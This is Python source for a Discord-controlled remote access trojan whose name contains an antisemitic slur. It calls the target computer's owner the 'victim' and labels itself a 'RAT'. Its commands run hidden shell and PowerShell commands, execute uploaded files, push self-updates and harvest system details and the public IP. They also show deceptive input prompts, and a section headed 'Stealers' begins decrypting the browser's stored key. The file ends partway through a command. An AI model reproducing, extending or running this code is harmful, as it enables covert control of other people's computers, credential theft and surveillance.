from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from threading import Thread, Event
from Cryptodome.Cipher import AES
from discord.ext import commands
from PIL import Image, ImageDraw
from comtypes import CLSCTX_ALL
import soundcard as sc
import win32com.client
import numpy as np
import subprocess
import webbrowser
import win32crypt
import pyautogui
import PyElevate
import pyperclip
import pythoncom
import datetime
import platform
import pymsgbox
import requests
import asyncio
import discord
import getpass
import sqlite3
import tarfile
import base64
import ctypes
import psutil
import shutil
import signal
import winreg
import shlex
import glob
import json
import time
import uuid
import wave
import cv2
import mss
import sys
import vdf
import wmi
import io
import os
import re

TOKEN = "bot token" # Do not remove or modify this comment (easy compiler looks for this) - 23r98h
version = "1.0.6.14" # Replace with current JewFuss-XT version (easy compiler looks for this to check for updates, so DO NOT MODIFY THIS COMMENT) - 25c75g

intents = discord.Intents.all()

bot = commands.Bot(command_prefix='$', intents=intents)
bot.remove_command('help')
pyautogui.FAILSAFE = False

async def fm_send(ctx, content: str, alt_content: str = None, filename: str = "output.txt", header=""):
    if len(header + header) > 2000:
        buf = io.BytesIO((alt_content or content).encode("utf-8"))
        await ctx.send(header, file=discord.File(fp=buf, filename=filename))
    else:
        await ctx.send(header + content)

async def fm_reply(ctx, content: str, alt_content: str = None, filename: str = "output.txt", header=""):
    if len(header + content) > 2000:
        buf = io.BytesIO((alt_content or content).encode("utf-8"))
        await ctx.reply(header, file=discord.File(fp=buf, filename=filename))
    else:
        await ctx.reply(header + content)

commands.Context.fm_send = fm_send
commands.Context.fm_reply = fm_reply

@bot.command(help="Updates JewFuss using the attached .exe file. (Must be a compiled installer, not a direct JewFuss executable)", usage="$update")
async def update(ctx):
    if not ctx.author.guild_permissions.administrator:
        await ctx.send("You don't have permission to access this command.")
        return
    if not ctx.message.attachments:
        await ctx.send("No file attached. Please attach a `.exe` file.")
        return

    attachment = ctx.message.attachments[0]
    if not attachment.filename.lower().endswith(".exe"):
        await ctx.send("Attached file must be a `.exe`.")
        return

    try:
        save_path = os.path.join(os.path.dirname(os.path.abspath(sys.argv[0])), attachment.filename)
        await attachment.save(save_path)

        prevpath = os.path.abspath(sys.argv[0])
        
        creationflags = (0x08000000 | 0x00000200)
        si = subprocess.STARTUPINFO()
        si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        si.wShowWindow = 0
        subprocess.Popen(
            [save_path, f"--prevpath={prevpath}"],
            creationflags=creationflags,
            startupinfo=si,
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            close_fds=True,
            shell=False
        )

        await ctx.send(f"Updater `{attachment.filename}` has been downloaded and executed.")
    except Exception as e:
        await ctx.send(f"Could not process the update. {e}")
        
@bot.command(help="send a popup prompt for victim to reply with, includes default response, `|` indicates start of default answer ", usage="$prompt <question> [| <default answer>]")
async def prompt(ctx, *, question_and_default: str = ""):
    await ctx.send("✅ Prompt sent to victim. Waiting for input...")

    parts = question_and_default.split("|", 1)
    question = parts[0].strip() if len(parts) >= 1 else ""
    default = parts[1].strip() if len(parts) == 2 else ""

    async def show_prompt_async():
        try:
            answer = await asyncio.to_thread(
                pymsgbox.prompt,
                question,
                "Input Required",
                default
            )

            if answer is None:
                return "User canceled the prompt."
            return f"User entered: `{answer}`"

        except Exception as e:
            return f"Error showing prompt: {e}"

    response = await show_prompt_async()
    await ctx.reply(response)

@bot.command(help="Checks if the victims device is up.", usage="$ping")
async def ping(ctx):
    await ctx.send("Pong!")

@bot.command(help="Shows victims device status including uptime, resource usage, etc.", usage="$status")
async def status(ctx):
    global version
    
    if True:
        # ── Names
        dev_name = platform.node()
        user_name = getpass.getuser()

        # ── Uptime (System & Bot)
        boot_time = psutil.boot_time()
        system_uptime = time.time() - boot_time
        program_uptime = time.time() - psutil.Process(os.getpid()).create_time()

        def format_duration(seconds):
            m, s = divmod(int(seconds), 60)
            h, m = divmod(m, 60)
            d, h = divmod(h, 24)
            return f"{d}d {h}h {m}m {s}s"

        # ── CPU & RAM Usage
        cpu_usage = psutil.cpu_percent(interval=1)
        proc = psutil.Process(os.getpid())
        rat_cpu = proc.cpu_percent(interval=1)
        rat_mem = proc.memory_info().rss / (1024**2)
        total_mem = psutil.virtual_memory().total / (1024**2)

        # ── Script Location
        script_path = os.path.abspath(sys.argv[0])

        # ── Embed
        embed = discord.Embed(
            title=f"`{dev_name}/{user_name}` Status",
            color=discord.Color.blue()
        )
        
        if ctx.author.guild_permissions.administrator:
            embed.add_field(name="Script Location", value=f"`{script_path}`", inline=False)
        embed.add_field(name="RAT Memory Usage", value=f"`{rat_mem:.2f}/{total_mem:.0f} MB`", inline=True)
        embed.add_field(name="RAT CPU Usage", value=f"`{rat_cpu}%`", inline=True)
        embed.add_field(name="System Uptime", value=f"`{format_duration(system_uptime)}`", inline=False)
        embed.add_field(name="Bot Uptime", value=f"`{format_duration(program_uptime)}`", inline=False)
        embed.add_field(name="System CPU Usage", value=f"`{cpu_usage}%`", inline=False)
        embed.add_field(name="Version", value=f"`{version}`", inline=False)
        await ctx.send(embed=embed)

def check_permissions(file_path):
    permissions = {
        'read': os.access(file_path, os.R_OK),
        'write': os.access(file_path, os.W_OK),
        'execute': os.access(file_path, os.X_OK),
        'delete': os.access(file_path, os.W_OK)
    }
    return permissions

@bot.command(help="Gets or sets the desktop wallpaper. Usage: $wallpaper get | $wallpaper set [optional: image path or upload image]", usage="$wallpaper <set|get> [location]")
async def wallpaper(ctx, action: str = None, filepath: str = None):
    try:
        if action is None or action.lower() not in ["get", "set"]:
            await ctx.send("Usage: `$wallpaper get` or `$wallpaper set [image path]` (or upload image)")
            return

        if action.lower() == "get":
            buf = ctypes.create_unicode_buffer(260)
            ctypes.windll.user32.SystemParametersInfoW(0x0073, len(buf), buf, 0)
            wallpaper_path = buf.value

            if os.path.exists(wallpaper_path):
                await ctx.send(
                    f"Current wallpaper is located at `{wallpaper_path}`",
                    file=discord.File(wallpaper_path, filename=os.path.basename(wallpaper_path))
                )
            else:
                await ctx.send(f"Wallpaper path: `{wallpaper_path}` (File not found)")
            return

        if action.lower() == "set":
            valid_exts = ('.png', '.jpg', '.jpeg', '.bmp')

            if filepath:
                if not os.path.exists(filepath):
                    await ctx.send(f"File not found: `{filepath}`")
                    return
                if not filepath.lower().endswith(valid_exts):
                    await ctx.send("Invalid file type from path. Must be .png, .jpg/jpeg, or .bmp.")
                    return
                ctypes.windll.user32.SystemParametersInfoW(20, 0, filepath, 3)
                await ctx.send(f"Wallpaper set from path: `{filepath}`")
                return

            if not ctx.message.attachments:
                await ctx.send("Please upload a `.png`, `.jpg/jpeg`, or `.bmp` image, or provide a valid path.")
                return

            attachment = ctx.message.attachments[0]
            if not any(attachment.filename.lower().endswith(ext) for ext in valid_exts):
                await ctx.send("Invalid file type. Only .png, .jpg/jpeg, or .bmp files are allowed.")
                return

            c = wmi.WMI()
            system_uuid = c.Win32_ComputerSystemProduct()[0].UUID
            ext = os.path.splitext(attachment.filename)[-1]
            temp_path = os.path.join(os.getenv("TEMP"), f"wallpaper_{system_uuid}{ext}")
            await attachment.save(temp_path)
            ctypes.windll.user32.SystemParametersInfoW(20, 0, temp_path, 3)
            await ctx.send("Wallpaper set successfully from uploaded image.")
    except Exception as e:
        await ctx.send(f"Error processing wallpaper command: {str(e)}")

@bot.command(aliases=["volume"], help="Set or check system volume.", usage="$vol <up|down|set|mute|unmute|query> [value]")
async def vol(ctx, action: str = "query", value: int = None):
    try:
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = ctypes.cast(interface, ctypes.POINTER(IAudioEndpointVolume))

        if action == "up":
            step = value if value is not None else 2
            current = volume.GetMasterVolumeLevelScalar()
            volume.SetMasterVolumeLevelScalar(min(current + step / 100, 1.0), None)
            await ctx.send(f"Volume increased to {int(volume.GetMasterVolumeLevelScalar() * 100)}%")

        elif action == "down":
            step = value if value is not None else 2
            current = volume.GetMasterVolumeLevelScalar()
            volume.SetMasterVolumeLevelScalar(max(current - step / 100, 0.0), None)
            await ctx.send(f"Volume decreased to {int(volume.GetMasterVolumeLevelScalar() * 100)}%")

        elif action == "set":
            if value is None or not (0 <= value <= 100):
                await ctx.send("Please provide a valid volume percentage (0-100).")
                return
            
            volume.SetMasterVolumeLevelScalar(value / 100, None)
            await ctx.send(f"Volume set to {value}%")

        elif action == "mute":
            volume.SetMute(1, None)
            await ctx.send("System muted.")

        elif action == "unmute":
            volume.SetMute(0, None)
            await ctx.send("System unmuted.")

        elif action == "query":
            current_volume = int(volume.GetMasterVolumeLevelScalar() * 100)
            mute = volume.GetMute()
            status = "Muted" if mute else "Unmuted"
            await ctx.send(f"Volume: {current_volume}% ({status})")

        else:
            await ctx.send("Invalid action. Use up, down, set, mute, unmute, or query.")

    except Exception as e:
        await ctx.send(f"Error adjusting volume: {str(e)}")

async def terminate_process(proc: subprocess.Popen, ctx):
    try:
        try:
            proc.send_signal(signal.CTRL_BREAK_EVENT)
        except Exception:
            proc.terminate()
        for _ in range(30):
            if proc.poll() is not None:
                return
            await asyncio.sleep(0.05)
        proc.kill()
    except Exception as e:
        await ctx.send(f"Error executing command: {e}")
    
@bot.command(help="Runs a command using subprocess and streams output live", usage="$cmd <command>")
async def cmd(ctx, *, command: str = None):
    if not command or not command.strip():
        await ctx.send("Command cannot be empty.")
        return

    try:
        creation = 0
        if hasattr(subprocess, "CREATE_NO_WINDOW"):
            creation |= subprocess.CREATE_NO_WINDOW
        if hasattr(subprocess, "CREATE_NEW_PROCESS_GROUP"):
            creation |= subprocess.CREATE_NEW_PROCESS_GROUP

        proc = await asyncio.create_subprocess_shell(
            f'cmd /c "{command}"',
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.STDOUT,
            creationflags=creation
        )

        thread = None
        watcher_task = None
        thread_deleted = False
        first_output = None
        pending = []
        pending_len = 0
        MAX_MSG = 1900
        FLUSH_INTERVAL = 0.7
        last_flush = time.monotonic()

        async def ensure_thread():
            nonlocal thread, watcher_task
            if thread is None:
                current_datetime = datetime.datetime.now().strftime("-%S")
                base = (command or "")[:100 - len(current_datetime)]
                name = f"{base}{current_datetime}" or "cmd-output"
                if first_output and len(f"**Output:**\n{first_output}") <= 2000:
                    msg = await ctx.send(f"**Output:**\n{first_output}")
                else:
                    buf = io.BytesIO((f"**Output:**\n{first_output}" if first_output else "**Output:**").encode("utf-8"))
                    msg = await ctx.send(file=discord.File(fp=buf, filename="command_output.txt"))
                thread = await msg.create_thread(name=name)

                async def watch_thread_delete():
                    nonlocal thread_deleted
                    try:
                        await bot.wait_for("thread_delete", check=lambda t: t.id == thread.id)
                        thread_deleted = True
                        await terminate_process(proc, ctx)
                    except Exception:
                        pass

                watcher_task = asyncio.create_task(watch_thread_delete())

        async def try_send(to_send: str | None, *, as_file_name: str | None = None):
            nonlocal thread_deleted
            try:
                await ensure_thread()
                if thread_deleted:
                    return False
                if as_file_name:
                    data = io.BytesIO(to_send.encode("utf-8"))
                    await thread.send(file=discord.File(fp=data, filename=as_file_name))
                else:
                    await thread.send(to_send)
                return True
            except (discord.NotFound, discord.Forbidden):
                thread_deleted = True
                await terminate_process(proc, ctx)
                return False

        async def flush(force=False):
            nonlocal pending, pending_len, last_flush, thread_deleted
            if thread_deleted or not pending:
                return
            if not force and (time.monotonic() - last_flush) < FLUSH_INTERVAL and pending_len < MAX_MSG:
                return
            chunk = "\n".join(pending)
            ok = True
            if len(chunk) > 2000:
                ok = await try_send(chunk, as_file_name="command_output.txt")
            else:
                ok = await try_send(chunk)
            pending.clear()
            pending_len = 0
            last_flush = time.monotonic()
            if not ok:
                return

        while True:
            if thread_deleted:
                break
            line = await proc.stdout.readline()
            if not line:
                if proc.returncode is not None:
                    break
                await asyncio.sleep(0.02)
                await flush()
                continue

            s = line.decode("utf-8", "replace").rstrip("\r\n")
            if not s:
                continue

            if first_output is None:
                first_output = s
                continue

            if len(s) > 2000:
                await try_send(s, as_file_name="line_output.txt")
                if thread_deleted:
                    break
                continue

            pending.append(s)
            pending_len += len(s) + 1
            if pending_len >= MAX_MSG:
                await flush(force=True)
            elif (time.monotonic() - last_flush) >= FLUSH_INTERVAL:
                await flush()

        if not thread_deleted and first_output and thread is None:
            await ctx.send(f"**Output:**\n{first_output}")

        if not thread_deleted:
            await flush(force=True)

        if watcher_task:
            watcher_task.cancel()

    except Exception as e:
        await ctx.send(f"Error executing command: {e}")

@bot.command(help="Runs a command in PowerShell and streams output live", usage="$ps <command>")
async def ps(ctx, *, command: str = None):
    if not command or not command.strip():
        await ctx.send("Command cannot be empty.")
        return

    try:
        ps_exe = shutil.which("pwsh") or shutil.which("powershell") or "powershell"
        ps_boot = "[Console]::OutputEncoding = New-Object System.Text.UTF8Encoding($false); $OutputEncoding = [Console]::OutputEncoding;"
        ps_cmd = [
            ps_exe,
            "-NoLogo",
            "-NoProfile",
            "-ExecutionPolicy", "Bypass",
            "-WindowStyle", "Hidden",
            "-NonInteractive",
            "-Command", f"{ps_boot}; & {{ {command} }} 2>&1"
        ]

        creation = 0
        if hasattr(subprocess, "CREATE_NO_WINDOW"):
            creation |= subprocess.CREATE_NO_WINDOW
        if hasattr(subprocess, "CREATE_NEW_PROCESS_GROUP"):
            creation |= subprocess.CREATE_NEW_PROCESS_GROUP

        proc = await asyncio.create_subprocess_exec(
            *ps_cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.STDOUT,
            stdin=asyncio.subprocess.DEVNULL,
            creationflags=creation
        )

        thread = None
        watcher_task = None
        thread_deleted = False
        first_output = None
        pending = []
        pending_len = 0
        MAX_MSG = 1900
        FLUSH_INTERVAL = 0.7
        last_flush = time.monotonic()

        async def ensure_thread():
            nonlocal thread, watcher_task
            if thread is None:
                current_datetime = datetime.datetime.now().strftime("-%S")
                base = (command or "")[:100 - len(current_datetime)]
                name = f"{base}{current_datetime}" or "ps-output"
                if first_output and len(f"**Output:**\n{first_output}") <= 2000:
                    msg = await ctx.send(f"**Output:**\n{first_output}")
                else:
                    buf = io.BytesIO((f"**Output:**\n{first_output}" if first_output else "**Output:**").encode("utf-8"))
                    msg = await ctx.send(file=discord.File(fp=buf, filename="command_output.txt"))
                thread = await msg.create_thread(name=name)

                async def watch_thread_delete():
                    nonlocal thread_deleted
                    try:
                        await bot.wait_for("thread_delete", check=lambda t: t.id == thread.id)
                        thread_deleted = True
                        await terminate_process(proc, ctx)
                    except Exception:
                        pass

                watcher_task = asyncio.create_task(watch_thread_delete())

        async def try_send(to_send: str | None, *, as_file_name: str | None = None):
            nonlocal thread_deleted
            try:
                await ensure_thread()
                if thread_deleted:
                    return False
                if as_file_name:
                    data = io.BytesIO(to_send.encode("utf-8"))
                    await thread.send(file=discord.File(fp=data, filename=as_file_name))
                else:
                    await thread.send(to_send)
                return True
            except (discord.NotFound, discord.Forbidden):
                thread_deleted = True
                await terminate_process(proc, ctx)
                return False

        async def flush(force=False):
            nonlocal pending, pending_len, last_flush, thread_deleted
            if thread_deleted or not pending:
                return
            if not force and (time.monotonic() - last_flush) < FLUSH_INTERVAL and pending_len < MAX_MSG:
                return
            chunk = "\n".join(pending)
            ok = True
            if len(chunk) > 2000:
                ok = await try_send(chunk, as_file_name="command_output.txt")
            else:
                ok = await try_send(chunk)
            pending.clear()
            pending_len = 0
            last_flush = time.monotonic()
            if not ok:
                return

        while True:
            if thread_deleted:
                break
            line = await proc.stdout.readline()
            if not line:
                if proc.returncode is not None:
                    break
                await asyncio.sleep(0.02)
                await flush()
                continue

            s = line.decode("utf-8", "replace").rstrip("\r\n")
            if not s:
                continue

            if first_output is None:
                first_output = s
                continue

            if len(s) > 2000:
                await try_send(s, as_file_name="line_output.txt")
                if thread_deleted:
                    break
                continue

            pending.append(s)
            pending_len += len(s) + 1
            if pending_len >= MAX_MSG:
                await flush(force=True)
            elif (time.monotonic() - last_flush) >= FLUSH_INTERVAL:
                await flush()

        if not thread_deleted and first_output and thread is None:
            await ctx.send(f"**Output:**\n{first_output}")

        if not thread_deleted:
            await flush(force=True)

        if watcher_task:
            watcher_task.cancel()

    except Exception as e:
        await ctx.send(f"Error executing command: {e}")

@bot.command(name="exec", help="Runs attached file and returns console output", usage="$exec [args]")
async def exec_attachment(ctx: commands.Context, *, args: str = ""):
    if not ctx.message.attachments or len(ctx.message.attachments) != 1:
        await ctx.send("Attach exactly one file.")
        return

    base_dir = os.path.dirname(os.path.abspath(sys.argv[0]))
    exec_dir = os.path.join(base_dir, "exec")
    os.makedirs(exec_dir, exist_ok=True)

    att = ctx.message.attachments[0]
    keep = "-_.()[]{} @"
    safe_name = "".join(c for c in att.filename if c.isalnum() or c in keep) or "uploaded.bin"
    dest = os.path.join(exec_dir, safe_name)
    i = 1
    while os.path.exists(dest):
        name, ext = os.path.splitext(safe_name)
        dest = os.path.join(exec_dir, f"{name}_{i}{ext}")
        i += 1

    try:
        await att.save(dest)
    except Exception as e:
        await ctx.send(f"Save failed: {e}")
        return

    ext = os.path.splitext(dest)[1].lower()
    if ext == ".exe":
        cmd = [dest]
    elif ext in (".py", ".pyw"):
        cmd = [sys.executable, dest]
    elif ext == ".ps1":
        cmd = ["powershell", "-NoProfile", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-File", dest]
    elif ext in (".bat", ".cmd"):
        cmd = ["cmd", "/c", dest]
    elif ext == ".sh":
        cmd = ["wsl", "bash", dest]
    else:
        cmd = [dest]

    if args.strip():
        cmd.extend(shlex.split(args))

    cmd_show = subprocess.list2cmdline(cmd)
    status = await ctx.send(
        f"> Executing `{os.path.basename(dest)}`\n"
        f"> * Full command: `{cmd_show}`"
        f"> * Args: `{args or '(none)'}`\n"
        f"> React 🛑 to stop."
    )
    try:
        await status.add_reaction("🛑")
    except Exception:
        pass

    si = subprocess.STARTUPINFO()
    si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    si.wShowWindow = 0

    try:
        proc = subprocess.Popen(
            cmd,
            cwd=exec_dir,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            stdin=subprocess.DEVNULL,
            text=True,
            bufsize=1,
            universal_newlines=True,
            creationflags=0x00000200 | 0x08000000,
            startupinfo=si,
            close_fds=True,
        )
        
    except FileNotFoundError:
        try: await status.delete()
        except Exception: pass
        await ctx.send(f"Interpreter not found for `{ext}`.")
        return
    
    except Exception as e:
        try: await status.delete()
        except Exception: pass
        await ctx.send(f"Failed to start: {e}")
        return

    output_chunks = []
    def read_stdout():
        try:
            for line in proc.stdout:
                output_chunks.append(line)
        except Exception:
            pass
    t = Thread(target=read_stdout, daemon=True)
    t.start()

    loop = asyncio.get_running_loop()
    stop_reason = None

    reaction_task = asyncio.create_task(
        ctx.bot.wait_for(
            "reaction_add",
            check=lambda r, u: (r.message.id == status.id and str(r.emoji) == "🛑" and not u.bot),
        )
    )
    
    proc_wait_future = loop.run_in_executor(None, proc.wait)
    done, _ = await asyncio.wait({reaction_task, proc_wait_future}, return_when=asyncio.FIRST_COMPLETED)

    if reaction_task in done and not proc_wait_future.done():
        stop_reason = "Stopped by reaction"
        try:
            subprocess.run(["taskkill", "/PID", str(proc.pid), "/T", "/F"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception:
            pass

    if not proc_wait_future.done():
        await proc_wait_future
    if not reaction_task.done():
        reaction_task.cancel()

    try:
        t.join(timeout=2)
    except Exception:
        pass

    rc = proc.returncode
    header = f"File: `{os.path.basename(dest)}` | Exit: `{rc}` | Status: {stop_reason or 'Exited normally'}"
    content = "".join(output_chunks) if output_chunks else "(no output)"

    try:
        await ctx.fm_reply(f"{content}", header=f"{header}\n")
    except Exception as e:
        await ctx.send(f"{header}\n(Output delivery error: {e})")

    try:
        await status.delete()
    except Exception:
        pass

    try:
        os.remove(dest)
    except Exception as e:
        print(f"Couldn't delete {os.path.basename(dest)}: {e}")

@bot.command(name='checkperms', help="Checks if the program has access to provided file path", usage="$checkperms <file/folder>")
async def checkperms(ctx, file_path: str):
    permissions = check_permissions(file_path)
    perms_message = '\n'.join([f'{perm}: {value}' for perm, value in permissions.items()])
    await ctx.send(f"Permissions for {file_path} are as follows:\n```{perms_message}```")

def compressed_device_id():
    uuid_raw = wmi.WMI().Win32_ComputerSystemProduct()[0].UUID
    return base64.b32encode(uuid.UUID(uuid_raw).bytes).decode().rstrip("=").lower()

@bot.command(help="Delete and recreate bot's channel, wiping all messages, and channel permssions", usage="$init [/f]")
async def init(ctx):
    if not ctx.author.guild_permissions.administrator:
        await ctx.send("You don't have permission to initialize this channel.")
        return

    category_name = f"{re.sub(r'[^a-zA-Z0-9_-]', '', os.environ.get('COMPUTERNAME', 'UnknownDevice'))}-{compressed_device_id()}"
    channel_name = re.sub(r'[^a-zA-Z0-9_-]', '', os.getlogin()).lower()

    category = discord.utils.get(ctx.guild.categories, name=category_name)

    if category is None:
        category_overwrites = {
            ctx.guild.default_role: discord.PermissionOverwrite(read_messages=False),
            ctx.guild.me: discord.PermissionOverwrite(read_messages=True) 
        }
        category = await ctx.guild.create_category(category_name, overwrites=category_overwrites)

    existing_channel = discord.utils.get(category.text_channels, name=channel_name)

    if ctx.message.content.endswith("/f"):
        if existing_channel:
            await existing_channel.delete()
        new_channel = await ctx.guild.create_text_channel(channel_name, category=category, overwrites=category.overwrites)
        await new_channel.send(f"Channel wiped by {ctx.author.mention}.")
    else:
        if existing_channel:
            await ctx.send("Channel already exists. Run `$init /f` to wipe the channel.")
        else:
            new_channel = await ctx.guild.create_text_channel(channel_name, category=category, overwrites=category.overwrites)
            await new_channel.send(f"Bot channel created by {ctx.author.mention}.")

@bot.event
async def on_guild_join(guild):
    category_name = f"{re.sub(r'[^a-zA-Z0-9_-]', '', os.environ.get('COMPUTERNAME', 'UnknownDevice'))}-{compressed_device_id()}"
    channel_name = re.sub(r'[^a-zA-Z0-9_-]', '', os.getlogin()).lower()

    category = discord.utils.get(guild.categories, name=category_name)
    
    if category is None:
        category_overwrites = {
            guild.default_role: discord.PermissionOverwrite(read_messages=False),
            guild.me: discord.PermissionOverwrite(read_messages=True)
        }
        category = await guild.create_category(category_name, overwrites=category_overwrites)

    existing_channel = discord.utils.get(category.text_channels, name=channel_name)

    if existing_channel is None:
        new_channel = await guild.create_text_channel(channel_name, category=category, overwrites=category.overwrites)
        await new_channel.send(f"Bot has joined! Please run `$init` in this channel to get started.")

@bot.event
async def on_ready():
    in_server_amount = 0
    logon_date = datetime.datetime.now().strftime("Latest logon: %m/%d/%Y %H:%M:%S") + f" (UTC{'-' if (offset := (time.altzone if time.localtime().tm_isdst else time.timezone) // 3600) < 0 else '+'}{abs(offset)})"

    for guild in bot.guilds:
        category_name = f"{re.sub(r'[^a-zA-Z0-9_-]', '', os.environ.get('COMPUTERNAME', 'UnknownDevice'))}-{compressed_device_id()}"
        channel_name = re.sub(r'[^a-zA-Z0-9_-]', '', os.getlogin()).lower()

        category = discord.utils.get(guild.categories, name=category_name)
        
        if category is None:
            category_overwrites = {
                guild.default_role: discord.PermissionOverwrite(read_messages=False),
                guild.me: discord.PermissionOverwrite(read_messages=True)
            }
            category = await guild.create_category(category_name, overwrites=category_overwrites)

        existing_channel = discord.utils.get(category.text_channels, name=channel_name)
        
        if existing_channel is None:
            new_channel = await guild.create_text_channel(channel_name, category=category, overwrites=category.overwrites)
            await new_channel.edit(topic=logon_date)
            await new_channel.send(f"`{os.getlogin()}` has logged on! Use this channel for further commands. {' (Ran as admin)' if PyElevate.elevated() else ''}")
        else:
            await existing_channel.edit(topic=logon_date)
            await existing_channel.send(f"`{os.getlogin()}` has logged on! Use this channel for further commands. {' (Ran as admin)' if PyElevate.elevated() else ''}")
        in_server_amount += 1

    print(f'Bot logged in as "{bot.user.name}" on {in_server_amount} server(s)')
    
@bot.event
async def on_message(message):
    if message.author.bot:
        return

    expected_category = f"{re.sub(r'[^a-zA-Z0-9_-]', '', os.environ.get('COMPUTERNAME', 'UnknownDevice'))}-{compressed_device_id()}"
    expected_channel = re.sub(r'[^a-zA-Z0-9_-]', '', os.getlogin()).lower()
    actual_category = message.channel.category.name if message.channel.category else None
    
    if actual_category != expected_category or message.channel.name != expected_channel:
        return  

    await bot.process_commands(message)
    
@bot.command(help="Gets information on the victim's system", usage="$sysinfo")
async def sysinfo(ctx):
    try:
        try:
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\DWM") as key:
                accent_color, _ = winreg.QueryValueEx(key, "AccentColor")
            b = (accent_color >> 16) & 0xFF
            g = (accent_color >> 8) & 0xFF
            r = accent_color & 0xFF
            color_hex = f"{r:02X}{g:02X}{b:02X}"
        except Exception as e:
            await ctx.send(f"Failed to read accent color (assuming default): {e}")
            color_hex = "0078D4"
            
        access = winreg.KEY_READ | getattr(winreg, "KEY_WOW64_64KEY", 0)
        with winreg.OpenKeyEx(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion", 0, access) as key:
            try:
                display_version, _ = winreg.QueryValueEx(key, "DisplayVersion")
            except FileNotFoundError:
                display_version = winreg.QueryValueEx(key, "ReleaseId")[0]
            build_number = str(winreg.QueryValueEx(key, "CurrentBuildNumber")[0])
            ubr = int(winreg.QueryValueEx(key, "UBR")[0])
            edition_id = str(winreg.QueryValueEx(key, "EditionID")[0])
            product_name = str(winreg.QueryValueEx(key, "ProductName")[0])

        windows_version = display_version
        windows_os_build = f"{build_number}.{ubr}"

        if "Server" in product_name:
            windows_os_type = product_name
        else:
            base = "Windows 11" if int(build_number) >= 22000 else "Windows 10"
            edition_map = {
                "Professional": "Pro",
                "Pro": "Pro",
                "Core": "Home",
                "Enterprise": "Enterprise",
                "EnterpriseS": "Enterprise LTSC",
                "Education": "Education",
                "ProEducation": "Pro Education",
                "ProWorkstation": "Pro for Workstations",
                "IoTEnterprise": "IoT Enterprise",
            }
            suffix = edition_map.get(edition_id, edition_id)
            windows_os_type = f"{base} {suffix}".strip()

        c = wmi.WMI()
        windows_devicename = platform.node()
        windows_device_uuid = c.Win32_ComputerSystemProduct()[0].UUID
        timezone = time.tzname[1] if time.daylight else time.tzname[0]

        system = c.Win32_ComputerSystem()[0]
        bios = c.Win32_BIOS()[0]
        processor = c.Win32_Processor()[0]
        network_adapters = c.Win32_NetworkAdapterConfiguration(IPEnabled=True)
        disks = c.Win32_DiskDrive()

        serial_number = getattr(bios, 'SerialNumber', "Unknown")
        manufacturer = getattr(system, 'Manufacturer', "Unknown")
        model = getattr(system, 'Model', "Unknown")
        total_ram_mb = int(system.TotalPhysicalMemory) // (1024**2) if hasattr(system, 'TotalPhysicalMemory') else None
        cpu = getattr(processor, 'Name', "Unknown")
        total_main_drive_storage = int(disks[0].Size) // (1024**3) if disks and hasattr(disks[0], 'Size') else None
        network_adapter = network_adapters[0].Description.split(" - ")[-1] if network_adapters else "Unknown"
        sku_number = getattr(c.Win32_ComputerSystemProduct()[0], 'IdentifyingNumber', "Unknown")
        ip = requests.get('https://api.ipify.org', timeout=5).content.decode('utf8')

    except Exception as e:
        await ctx.send(f"Error fetching system information: {e}")
        return

    def isKnown(value: str):
        value = str(value).strip().lower()
        return value not in ("unknown", "default string", "")

    embed = discord.Embed(
        title=f"System Information for `{windows_devicename}`",
        color=int(color_hex, 16)
    )

    embed.add_field(
        name="Windows Info:",
        value=(
            f"UUID: `{windows_device_uuid.strip()}`\n"
            f"Type: `{windows_os_type.strip()}`\n"
            f"Build: `{windows_os_build.strip()}`\n"
            f"Version: `{windows_version.strip()}`"
        ),
        inline=False
    )

    embed.add_field(name="Device Specifications:", value= (
        f"Manufacturer: `{manufacturer.strip()}`\n"
        + (f"Serial #: `{serial_number.strip()}`\n" if isKnown(serial_number) else "")
        + f"Model: `{model.strip()}`\n\n"
        + (f"Total RAM: `{total_ram_mb/1024:.2f} GB | ({total_ram_mb} MB)`\n" if total_ram_mb is not None else "")
        + f"CPU: `{cpu.strip()}`\n"
        + (f"Main Drive Size: `{total_main_drive_storage} GB`\n" if total_main_drive_storage is not None else "")
        + f"Network adapter: `{network_adapter.strip()}`\n"
        + (f"SKU #: `{sku_number.strip()}`\n" if isKnown(sku_number) else "")
    ), inline=False)

    embed.add_field(
        name="Other Information:",
        value=f"Public IP: `{ip}`\nTimezone: `{timezone}`",
        inline=False
    )

    await ctx.send(embed=embed)
    
# Stealers

def get_master_key(local_state_path):
    with open(local_state_path, 'r', encoding='utf-8') as f:
        local_state = json.load(f)
    encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]
    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

@bot.command(aliases=["liststartapps"], help="Lists valid Start Menu shortcuts on the victim's system.", usage="$startapps")
async def startapps(ctx):

    start_menu_paths = [
        os.path.join(os.getenv("ProgramData"), r"Microsoft\Windows\Start Menu\Programs"),
        os.path.join(os.getenv("APPDATA"), r"Microsoft\Windows\Start Menu\Programs")
    ]

    shell = win32com.client.Dispatch("WScript.Shell")
    exclude_keywords = {"eula", "documentation", "faq"}
    apps = []
    appsunsf = []

    for base_path in start_menu_paths:
        for root, _, files in os.walk(base_path):
            for file in files:
                if not file.lower().endswith(".lnk"):
                    continue

                full_path = os.path.join(root, file)
                name = os.path.splitext(file)[0]

                if any(excluded in name.lower() for excluded in exclude_keywords):
                    continue

                try:
                    shortcut = shell.CreateShortcut(full_path)
                    target = shortcut.TargetPath
                    if not target or not os.path.exists(target):
                        continue
                except:
                    continue

                apps.append(f"> **{name}** `{full_path}`")
                appsunsf.append(f"{name} - {full_path}")
                
    output = "\n".join(sorted(apps)) or "No valid shortcuts found."
    outputunsf = "\n".join(sorted(appsunsf)) or "No valid shortcuts found."
